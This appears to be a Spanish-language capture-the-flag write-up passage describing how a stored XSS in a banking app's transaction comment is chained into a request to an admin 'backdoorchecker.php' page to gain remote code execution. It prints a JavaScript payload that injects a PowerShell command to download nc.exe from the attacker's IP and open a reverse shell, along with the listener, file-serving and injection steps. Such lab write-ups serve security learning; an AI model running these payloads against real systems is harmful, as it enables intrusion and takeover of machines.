## Vuln exploit & Gaining Access {-}

### De un XSS a un XSRF par conseguir un RCE para ganar accesso al systema{-}

Esto puede funccionar unicamente si el usuario admin que valida las transacciones esta loggeada al panel de administracion desde la propria maquina victima.

Intentamos y miramos.

1. Creamos un ficher pwned.js

    ```javascript
    var request = new XMLHttpRequest();
    params = 'cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443';
    request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
    request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    request.send(params);
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Preparamos el nc.exe y creamos un servidor web con python

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe .
    python3 -m http.server 80
    ```

1. Lanzamos una transaccion

    ```bash
    Amount: 1
    ID of Addressee: 1
    Comment to him/her: <script src="http://10.10.17.51/pwned.js"></script>
    ```

Hemos ganado accesso a la maquina victima como el usuario cortin y podemos visualizar la flag.

```bash
whoami
bankrobber\cortin

type C:\Users\cortin\Desktop\user.txt
```
